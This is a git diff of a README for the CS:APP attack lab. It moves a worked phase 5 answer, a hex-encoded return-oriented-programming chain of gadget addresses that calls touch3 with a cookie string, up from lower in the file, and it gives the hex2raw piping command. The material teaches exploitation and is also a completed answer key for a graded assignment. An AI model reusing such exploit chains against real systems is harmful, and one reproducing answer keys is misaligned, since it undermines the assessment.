@@ -13,6 +13,30 @@ when you write system code. We do not condone the use of any other form of attac
 access to any system resources. You will want to study Sections 3.10.3 and 3.10.4 of the CS:APP3e book
 (Computer Systems: A Programmer’s Perspective) as reference material for this lab.
 
+## Example, what the solution look like
+The following is my key for phase5
+```
+48 c7 c7 70 2b 68 55 c3 \ buffer of 56 bytes
+00 00 00 00 00 00 00 00 \ .
+35 35 37 36 64 65 30 35 \ .
+00 00 00 00 00 00 00 00 \ .
+00 00 00 00 00 00 00 00 \ .
+00 00 00 00 00 00 00 00 \ ,
+00 00 00 00 00 00 00 00 \ buffer end
+ed 19 40 00 00 00 00 00 \ pop rax O (this is ret address, so no the bottom of stack is on next line)
+20 00 00 00 00 00 00 00 \ value for rsi (bottom of stack when pop)
+b2 1a 40 00 00 00 00 00 \ movl eax,ecx (address of gadget) "89 c1 c3" is stored at address 0x401ab2 to 0x401ab4
+11 1a 40 00 00 00 00 00 \ movl ecx,edx (address of gadget) "89 c1 c3" is machine language corresponding to movl eax,ecx ret
+7b 1a 40 36 64 65 30 35 \ movl edx,edi (address of gadget)  
+2c 1a 40 00 00 00 00 00 \ mov  rsp,rax (address of gadget) get rsp address
+de 19 40 00 00 00 00 00 \ mov  rax,rdi (address of gadget)
+fd 19 40 00 00 00 00 00 \ lea  (%rdi,%rsi,1),%rax (address of gadget) get the address of target value by displacemet on rsp
+de 19 40 00 00 00 00 00 \ mov rax,rdi
+34 19 40 00 00 00 00 00 \ address of touch3() rdi, address of targetvalue, is passed to touch3() and call touch3()
+35 35 37 36 64 65 30 35 \ target value
+00
+```
+
 ## Before you start
 You are suggested to have some basic understanding of Assembly langauge and memory allocation. Some suggestion:
 * Read *Bryant & O’Hallaron, "Computer Systems: a Programmer’s Perspective", 3rd Edition, 3.10.2~3.10.5*
@@ -55,32 +79,6 @@ There are 5 phases:
 `info address <target function>` to find the address of functions you need.
 Write your input as hex in key
 `./hex2raw < key | ./ctarget` to encrylt your input and pass to target
-
-## Illustration of answer by example phase5
-The following is my key for phase5
-```
-48 c7 c7 70 2b 68 55 c3 \ buffer of 56 bytes
-00 00 00 00 00 00 00 00 \ .
-35 35 37 36 64 65 30 35 \ .
-00 00 00 00 00 00 00 00 \ .
-00 00 00 00 00 00 00 00 \ .
-00 00 00 00 00 00 00 00 \ ,
-00 00 00 00 00 00 00 00 \ buffer end
-ed 19 40 00 00 00 00 00 \ pop rax O (this is ret address, so no the bottom of stack is on next line)
-20 00 00 00 00 00 00 00 \ value for rsi (bottom of stack when pop)
-b2 1a 40 00 00 00 00 00 \ movl eax,ecx (address of gadget) "89 c1 c3" is stored at address 0x401ab2 to 0x401ab4
-11 1a 40 00 00 00 00 00 \ movl ecx,edx (address of gadget) "89 c1 c3" is machine language corresponding to movl eax,ecx ret
-7b 1a 40 36 64 65 30 35 \ movl edx,edi (address of gadget)  
-2c 1a 40 00 00 00 00 00 \ mov  rsp,rax (address of gadget) get rsp address
-de 19 40 00 00 00 00 00 \ mov  rax,rdi (address of gadget)
-fd 19 40 00 00 00 00 00 \ lea  (%rdi,%rsi,1),%rax (address of gadget) get the address of target value by displacemet on rsp
-de 19 40 00 00 00 00 00 \ mov rax,rdi
-34 19 40 00 00 00 00 00 \ address of touch3() rdi, address of targetvalue, is passed to touch3() and call touch3()
-35 35 37 36 64 65 30 35 \ target value
-00
-```
-
-
 
 ## Author
 * **Chen Li** 
